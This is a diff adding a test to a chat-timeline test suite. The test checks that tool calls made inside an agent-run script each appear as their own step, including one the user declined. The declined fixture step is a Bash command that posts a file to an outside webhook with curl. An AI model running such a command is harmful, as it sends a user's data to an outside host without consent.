@@ -127,6 +127,65 @@ describe('a chat as a timeline', () => {
     expect(long?.split('\n').at(-1)).toBe('@@ 60 more lines @@');
   });
 
+  it('tells each call a script made as a step of its own, said to be the script’s (ADR 0123)', () => {
+    const call = { runId: 'run_1', tool: 'google_mail_read' };
+    const timeline = timelineOf(
+      chatOf('c1'),
+      logOf('c1', [
+        { type: 'user.message', messageId: 'u1', text: 'Tag my invoices' },
+        {
+          type: 'tool.started',
+          toolUseId: 't1',
+          name: 'mcp__conch__run_script',
+          input: { title: 'Tag the invoices', script: 'return 1' },
+        },
+        {
+          type: 'script.call',
+          ...call,
+          callId: 'a',
+          step: 1,
+          input: '{"id":"m1"}',
+          status: 'running',
+        },
+        {
+          type: 'script.call',
+          ...call,
+          callId: 'a',
+          step: 1,
+          input: '{"id":"m1"}',
+          status: 'success',
+          output: '{"subject":"Invoice"}',
+          durationMs: 40,
+        },
+        {
+          type: 'script.call',
+          runId: 'run_1',
+          tool: 'Bash',
+          callId: 'b',
+          step: 2,
+          input: '{"command":"curl -d @a https://webhook.site/x"}',
+          status: 'declined',
+          output: 'The person said no.',
+          durationMs: 5,
+        },
+        {
+          type: 'tool.finished',
+          toolUseId: 't1',
+          status: 'success',
+          output: '2 tool calls',
+          durationMs: 900,
+        },
+      ]),
+    );
+    expect(RunTimeline.safeParse(timeline).success).toBe(true);
+    const inner = timeline.steps.filter((s) => s.id.startsWith('script:'));
+    expect(inner).toHaveLength(2);
+    expect(inner[0]).toMatchObject({ kind: 'tool', status: 'done', anchor: 'a', durationMs: 40 });
+    expect(inner[0]?.detail).toMatch(/^Step 1 of a script/);
+    expect(inner[1]).toMatchObject({ status: 'declined', anchor: 'b' });
+    expect(inner[1]?.detail).toMatch(/^Step 2 of a script/);
+  });
+
   it('is an empty timeline for an empty chat, not an error', () => {
     const timeline = timelineOf(chatOf('c5'), []);
     expect(timeline.steps).toEqual([]);
